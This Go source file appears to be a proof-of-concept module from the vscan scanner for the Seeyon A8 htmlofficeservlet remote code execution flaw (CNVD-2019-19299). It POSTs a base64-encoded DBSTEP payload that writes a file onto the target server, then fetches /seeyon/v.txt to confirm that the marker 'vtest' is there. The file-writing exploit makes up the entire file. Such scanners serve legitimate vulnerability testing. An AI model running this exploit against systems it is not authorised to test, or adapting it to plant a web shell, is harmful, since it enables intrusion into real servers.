package seeyon

import (
	"encoding/base64"
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//A8 htmlofficeservlet RCE漏洞

func CNVD_2019_19299(u string) bool {
	payload := "REJTVEVQIFYzLjAgICAgIDM0MiAgICAgICAgICAgICAwICAgICAgICAgICAgICAgMDUgICAgICAgICAgICAgREJTVEVQPU9LTUxsS2xWDQpPUFRJT049UzNXWU9TV0xCU0dyDQpjdXJyZW50VXNlcklkPXpVQ1R3aWdzemlDQVBMZXN3NGdzdzRvRXdWNjYNCkNSRUFURURBVEU9d1VnWHdCM3NQQjNod3M2Ng0KUkVDT1JESUQ9cUxTR3c0U1h6TGVHdzRWM3dVdzN6VW9Yd2lkNg0Kb3JpZ2luYWxGaWxlSWQ9d1Y2Ng0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdVZ2hQQjNzekIzWHdnNjYNCkZJTEVOQU1FPXFmVGRxZlRkcWZUZFZheEplQUpRQlJsM2RFeFF5WU9kTkFsZmVheHNkR2hpeVlsVGNBVGROZlQzYnJWNg0KbmVlZFJlYWRGaWxlPXlSV1pkQVM2DQpvcmlnaW5hbENyZWF0ZURhdGU9d0xlaXdMU2h3aWdYd0xnc3dnNjYNCnZ0ZXN0"
	sEnc, _ := base64.StdEncoding.DecodeString(payload)
	if req, err := pkg.HttpRequset(u+"/seeyon/htmlofficeservlet", "POST", string(sEnc), false, nil); err == nil {
		if req.StatusCode == 200 {
			if req2, err := pkg.HttpRequset(u+"/seeyon/v.txt", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "vtest") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon CNVD_2019_19299|%s\n", u+"/seeyon/v.txt"))
					return true
				}
			}
		}
	}
	return false
}
